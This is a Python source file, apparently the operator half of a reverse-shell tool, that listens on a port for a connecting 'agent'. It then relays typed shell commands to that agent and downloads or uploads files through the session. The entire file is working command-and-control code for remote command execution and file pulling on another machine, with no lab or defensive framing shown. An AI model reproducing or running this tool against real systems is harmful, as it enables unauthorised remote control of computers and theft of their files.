# Casey Listener

import socket, subprocess, os
import json


class Listener:
    # CONSTRUCTOR METHOD =====
    def __init__(self, ip, port):
        self.localSocket  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bufferSize   = 1024
        self.operatingSys = ""

        self.localSocket.bind((ip, port))
        self.localSocket.listen(0)
        print(f"[+] Listening for incoming connection on port {port}...")

        self.agentSocket, agentAddress = self.localSocket.accept()
        self.agentIP = agentAddress[0]
        print(f"[+] Connection established with {self.agentIP} on port {port}!")
    # END OF CONSTRUCTOR METHOD

    # SEND DATA =====
    def sendData(self, data):
        jsonData = json.dumps(data)

        self.agentSocket.send(jsonData.encode())
    # END OF sendData METHOD

    # RECEIVE DATA =====
    def recvData(self):
        jsonData = ""

        while (True):
            try:
                jsonData += self.agentSocket.recv(self.bufferSize).decode()

                return json.loads(jsonData)

            except ValueError:
                continue
    # END OF recvData METHOD

    # SEND FILE =====
    def sendFile(self, file_path):
        file    = open(file_path, "rb")
        data    = file.read()
        dataLen = len(data)

        self.agentSocket.send(str(dataLen).encode())
        confirmMsg = self.agentSocket.recv(2)

        self.agentSocket.sendall(data)
        confirmMsg = self.agentSocket.recv(2)

        file.close()
    # END OF sendFile METHOD

    # RECEIVE FILE =====
    def recvFile(self, cmd_list): 
        destination = ""

        if (len(cmd_list) == 2):
            filePath = cmd_list[-1]
            if   (self.operatingSys == "Windows"): destination = filePath.split("\\")[-1]
            elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
        elif (len(cmd_list) == 3): destination = cmd_list[-1]

        dataSize = int(self.agentSocket.recv(self.bufferSize).decode())
        self.agentSocket.send(b"OK")

        file      = open(destination, "wb")
        fileBytes = b""
        buffer    = 5000000
        
        while (len(fileBytes) < dataSize):
            curBytes    = len(fileBytes)
            remainBytes = dataSize - curBytes

            if   (buffer <= remainBytes): fileBytes += self.agentSocket.recv(buffer)
            elif (remainBytes < buffer):  fileBytes += self.agentSocket.recv(remainBytes)
        
        file.write(fileBytes)
        file.close()
        self.agentSocket.send(b"OK")

        print(f"[+] Listener: Downloaded {len(fileBytes)} bytes of data")
        print(f"[+] Listener: File successfully saved to {destination}")

        return
    # END OF recvFile METHOD

    # EXECUTE =====
    def execute(self):
        try:
            banner = self.recvData()
            print(banner)

            if   ("Windows" in banner): self.operatingSys = "Windows"
            elif ("Unix" in banner):    self.operatingSys = "Unix"

            while (True):
                prompt = self.recvData()

                command = ""
                while (command == ""): command = input(prompt)
                cmdList = command.split()

                # Exit
                if (command.lower() == "exit"):
                    print("[+] Exiting the program\n")
                    self.sendData(command)
                    self.localSocket.close()
                    break

                # Other commands
                else:
                    self.sendData(command)

                    # Download file
                    if (cmdList[0].lower() == "download"):
                        self.recvFile(cmdList)
                        commandResult = self.recvData()
                        print(commandResult)

                    # Upload file
                    elif (cmdList[0].lower() == "upload"):
                        filePath = cmdList[1]

                        self.sendFile(filePath)
                        print("[+] Listener: File transfer complete")

                        commandResult = self.recvData()
                        print(commandResult)
                    
                    # Other commands
                    else: 
                        commandResult = self.recvData()
                        print(commandResult)

        except KeyboardInterrupt:
            print("\n[+] Exiting the program\n")
            self.localSocket.close()

    # END OF execute METHOD
            

# BEGINNING OF MAIN =====

listener = Listener("127.0.0.1", 7399) # Change the IP address to the IP address of the listening (this) computer
listener.execute()

# END OF MAIN =====
